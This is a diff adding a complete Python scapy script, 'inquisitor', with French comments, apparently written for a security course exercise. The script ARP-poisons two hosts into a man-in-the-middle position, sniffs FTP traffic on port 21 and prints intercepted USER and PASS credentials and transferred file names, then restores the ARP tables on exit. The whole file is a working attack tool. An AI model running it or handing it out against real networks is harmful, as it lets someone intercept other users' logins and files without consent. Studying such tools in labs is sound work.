@@ -1,0 +1,136 @@
+#!/usr/bin/env python3
+import sys
+import os
+import signal
+import time
+import threading
+import ipaddress
+import re
+from scapy.all import ARP, Ether, sendp, sniff, TCP, Raw
+
+# Variables globales pour la gestion du signal d'arrêt
+RUNNING = True
+
+def is_valid_mac(mac):
+    return bool(re.match(r"^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$", mac))
+
+def parse_args():
+    if len(sys.argv) != 5:
+        print("Usage: ./inquisitor <IP-src> <MAC-src> <IP-target> <MAC-target>")
+        sys.exit(1)
+
+    ip_src, mac_src, ip_tgt, mac_tgt = sys.argv[1:5]
+
+    try:
+        ipaddress.IPv4Address(ip_src)
+        ipaddress.IPv4Address(ip_tgt)
+    except ValueError:
+        print("Erreur : Adresse IP invalide.")
+        sys.exit(1)
+
+    if not is_valid_mac(mac_src) or not is_valid_mac(mac_tgt):
+        print("Erreur : Adresse MAC invalide (format attendu : xx:xx:xx:xx:xx:xx).")
+        sys.exit(1)
+
+    return {
+        "ip_src": ip_src,
+        "mac_src": mac_src.lower(),
+        "ip_target": ip_tgt,
+        "mac_target": mac_tgt.lower()
+    }
+
+def poison_loop(src, target):
+    """
+    Envoie en boucle des paquets ARP Reply forgés :
+    - Au 'target', on dit que 'src.ip' est sur notre MAC
+    - Au 'src', on dit que 'target.ip' est sur notre MAC
+    """
+    pkt_to_target = Ether(dst=target["mac"]) / ARP(
+        op=2, # is-at (reply)
+        pdst=target["ip"],
+        hwdst=target["mac"],
+        psrc=src["ip"]
+        # hwsrc est automatiquement l'adresse MAC de l'attaquant
+    )
+
+    pkt_to_src = Ether(dst=src["mac"]) / ARP(
+        op=2,
+        pdst=src["ip"],
+        hwdst=src["mac"],
+        psrc=target["ip"]
+    )
+
+    print("[*] Début de l'empoisonnement ARP...")
+    while RUNNING:
+        sendp(pkt_to_target, verbose=False)
+        sendp(pkt_to_src, verbose=False)
+        time.sleep(2)
+
+def restore_arp(src, target):
+    """
+    Restaure les tables ARP d'origine en envoyant la vraie association.
+    """
+    print("\n[*] Restauration des tables ARP...")
+    # On rétablit la vraie MAC du src auprès du target
+    pkt_restore_target = Ether(dst=target["mac"]) / ARP(
+        op=2,
+        pdst=target["ip"],
+        hwdst=target["mac"],
+        psrc=src["ip"],
+        hwsrc=src["mac"]
+    )
+    # On rétablit la vraie MAC du target auprès du src
+    pkt_restore_src = Ether(dst=src["mac"]) / ARP(
+        op=2,
+        pdst=src["ip"],
+        hwdst=src["mac"],
+        psrc=target["ip"],
+        hwsrc=target["mac"]
+    )
+
+    for _ in range(3):
+        sendp(pkt_restore_target, verbose=False)
+        sendp(pkt_restore_src, verbose=False)
+        time.sleep(0.5)
+    print("[+] Tables ARP restaurées.")
+
+def packet_callback(pkt):
+    # On ignore les paquets émis par notre propre machine
+    if pkt[Ether].src == Ether().src:
+        return
+
+    if pkt.haslayer(TCP) and pkt.haslayer(Raw):
+        payload = pkt[Raw].load.decode("latin1", errors="ignore").strip()
+
+        if payload.startswith("USER ") or payload.startswith("PASS "):
+            print(f"[FTP AUTH] {payload}")
+        elif payload.startswith("RETR "):
+            print(f"[FTP TRANSFERT] Fichier téléchargé (GET) : {payload[5:].strip()}")
+        elif payload.startswith("STOR "):
+            print(f"[FTP TRANSFERT] Fichier envoyé (PUT) : {payload[5:].strip()}")
+
+def main():
+    global RUNNING
+    cfg = parse_args()
+
+    src = {"ip": cfg["ip_src"], "mac": cfg["mac_src"]}
+    target = {"ip": cfg["ip_target"], "mac": cfg["mac_target"]}
+
+    poison_thread = threading.Thread(target=poison_loop, args=(src, target), daemon=True)
+    poison_thread.start()
+
+    print("[*] Sniffing en cours sur le port 21 (FTP)... (Ctrl+C pour quitter)")
+    try:
+        sniff(
+            filter=f"tcp port 21 and (host {src['ip']} or host {target['ip']})",
+            prn=packet_callback,
+            store=False
+        )
+    except KeyboardInterrupt:
+        print("\n[!] Arrêt demandé par l'utilisateur.")
+    finally:
+        RUNNING = False
+        restore_arp(src, target)
+
+if __name__ == "__main__":
+    main()
